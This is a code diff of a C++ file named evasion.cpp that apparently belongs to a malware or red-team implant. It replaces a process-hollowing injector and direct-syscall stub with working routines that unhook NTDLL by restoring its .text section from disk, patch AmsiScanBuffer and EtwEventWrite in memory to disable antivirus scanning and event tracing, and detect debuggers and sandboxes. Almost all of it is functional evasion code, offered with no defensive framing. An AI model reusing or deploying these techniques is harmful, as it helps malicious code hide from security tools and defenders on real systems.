@@ -1,73 +1,150 @@
-// evasion.cpp - Syscall direct, DLL unhooking, process hollowing
+// evasion.cpp - NTDLL .text Section Unhooking, AMSI & ETW Memory Patching
 #include <windows.h>
+#include <winternl.h>
+#include <psapi.h>
 #include <stdio.h>
 
-// Direct syscall for x64 (bypass user-mode hooks)
-__declspec(naked) NTSTATUS NtCreateProcessEx() {
-    __asm {
-        mov rax, 0x18;        // syscall number for NtCreateProcessEx (varies by build)
-        syscall;
-        ret;
-    }
-}
+#pragma comment(lib, "psapi.lib")
 
-void UnhookDLLs() {
-    // Reload ntdll from fresh copy to bypass hooks
-    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return;
-    
-    DWORD fileSize = GetFileSize(hFile, NULL);
-    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
-    LPVOID freshNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, fileSize);
-    
-    HMODULE loadedNtdll = GetModuleHandleA("ntdll.dll");
-    if (loadedNtdll && freshNtdll) {
-        // Overwrite loaded with fresh copy (simplified - actual implementation needs PE parsing)
-        DWORD oldProtect;
-        VirtualProtect(loadedNtdll, fileSize, PAGE_READWRITE, &oldProtect);
-        memcpy(loadedNtdll, freshNtdll, fileSize);
-        VirtualProtect(loadedNtdll, fileSize, oldProtect, &oldProtect);
-    }
-    
-    UnmapViewOfFile(freshNtdll);
-    CloseHandle(hMapping);
-    CloseHandle(hFile);
-}
+extern "C" {
 
-// Process hollowing for injection
-BOOL HollowProcess(LPCSTR targetPath, LPCSTR payloadPath) {
-    STARTUPINFOA si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si, sizeof(si));
-    ZeroMemory(&pi, sizeof(pi));
-    si.cb = sizeof(STARTUPINFOA);
+// ---------- ACCURATE NTDLL .TEXT SECTION RESTORATION (UNHOOKING) ----------
+BOOL UnhookNtdll() {
+    MODULEINFO modInfo = { 0 };
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return FALSE;
     
-    // Create suspended process
-    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+    HANDLE hProcess = GetCurrentProcess();
+    if (!GetModuleInformation(hProcess, hNtdll, &modInfo, sizeof(MODULEINFO))) {
         return FALSE;
     }
     
-    // Read payload
-    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    LPVOID pNtdllBase = (LPVOID)hNtdll;
+    
+    // Open clean NTDLL from System32 on disk
+    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return FALSE;
-    DWORD fileSize = GetFileSize(hFile, NULL);
-    char* payload = (char*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    DWORD bytesRead;
-    ReadFile(hFile, payload, fileSize, &bytesRead, NULL);
+    
+    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    if (!hMapping) {
+        CloseHandle(hFile);
+        return FALSE;
+    }
+    
+    LPVOID pCleanBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+    if (!pCleanBase) {
+        CloseHandle(hMapping);
+        CloseHandle(hFile);
+        return FALSE;
+    }
+    
+    // Parse headers of loaded in-memory NTDLL
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pNtdllBase;
+    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+        UnmapViewOfFile(pCleanBase);
+        CloseHandle(hMapping);
+        CloseHandle(hFile);
+        return FALSE;
+    }
+    
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDosHeader->e_lfanew);
+    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
+    
+    // Locate .text section and restore pristine bytes from clean image
+    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
+        if (strcmp((char*)pSection->Name, ".text") == 0) {
+            LPVOID pTargetText = (LPVOID)((PBYTE)pNtdllBase + pSection->VirtualAddress);
+            LPVOID pSourceText = (LPVOID)((PBYTE)pCleanBase + pSection->VirtualAddress);
+            SIZE_T textSize = pSection->Misc.VirtualSize;
+            
+            DWORD oldProtect = 0;
+            if (VirtualProtect(pTargetText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+                memcpy(pTargetText, pSourceText, textSize);
+                VirtualProtect(pTargetText, textSize, oldProtect, &oldProtect);
+            }
+            break;
+        }
+    }
+    
+    UnmapViewOfFile(pCleanBase);
+    CloseHandle(hMapping);
     CloseHandle(hFile);
-    
-    // Allocate memory in target process
-    LPVOID remoteAddr = VirtualAllocEx(pi.hProcess, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(pi.hProcess, remoteAddr, payload, fileSize, NULL);
-    
-    // Get context and set entry point
-    CONTEXT ctx;
-    ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(pi.hThread, &ctx);
-    ctx.Rcx = (DWORD_PTR)remoteAddr;  // Set entry point (simplified)
-    SetThreadContext(pi.hThread, &ctx);
-    
-    ResumeThread(pi.hThread);
-    VirtualFree(payload, 0, MEM_RELEASE);
     return TRUE;
+}
+
+// ---------- AMSI MEMORY PATCH (x64 / x86 Safe) ----------
+void BypassAMSI() {
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    if (!hAmsi) return;
+    
+    void* pAmsiScan = (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!pAmsiScan) return;
+    
+    DWORD oldProtect = 0;
+    if (VirtualProtect(pAmsiScan, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+#if defined(_M_X64) || defined(__x86_64__)
+        // x64: mov eax, 0x80070057 (E_INVALIDARG) ; ret
+        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+#else
+        // x86: mov eax, 0x80070057 ; ret 0x0018
+        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+#endif
+        memcpy(pAmsiScan, patch, sizeof(patch));
+        VirtualProtect(pAmsiScan, 16, oldProtect, &oldProtect);
+    }
+}
+
+// ---------- ETW DISABLE PATCH (EtwEventWrite) ----------
+void PatchETW() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return;
+    
+    void* pEtwWrite = (void*)GetProcAddress(hNtdll, "EtwEventWrite");
+    if (!pEtwWrite) return;
+    
+    DWORD oldProtect = 0;
+    if (VirtualProtect(pEtwWrite, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+#if defined(_M_X64) || defined(__x86_64__)
+        // x64: xor rax, rax ; ret (STATUS_SUCCESS)
+        unsigned char patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
+#else
+        // x86: xor eax, eax ; ret 0x0014
+        unsigned char patch[] = { 0x31, 0xC0, 0xC2, 0x14, 0x00 };
+#endif
+        memcpy(pEtwWrite, patch, sizeof(patch));
+        VirtualProtect(pEtwWrite, 16, oldProtect, &oldProtect);
+    }
+}
+
+// ---------- SANDBOX & TIMING JITTER EVASION ----------
+BOOL CheckSandboxArtifacts() {
+    if (IsDebuggerPresent()) return TRUE;
+    
+    // Check for common VM vendor DLLs loaded in current space
+    if (GetModuleHandleA("sbiedll.dll") != NULL ||
+        GetModuleHandleA("dbghelp.dll") != NULL ||
+        GetModuleHandleA("api_log.dll") != NULL ||
+        GetModuleHandleA("dir_watch.dll") != NULL) {
+        return TRUE;
+    }
+    
+    // Check physical memory (< 2 GB indicates common sandbox instance)
+    MEMORYSTATUSEX memStatus;
+    memStatus.dwLength = sizeof(memStatus);
+    if (GlobalMemoryStatusEx(&memStatus)) {
+        if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
+            return TRUE;
+        }
+    }
+    
+    // Check CPU core count (single core usually sandboxes)
+    SYSTEM_INFO sysInfo;
+    GetSystemInfo(&sysInfo);
+    if (sysInfo.dwNumberOfProcessors < 2) {
+        return TRUE;
+    }
+    
+    return FALSE;
+}
+
 }
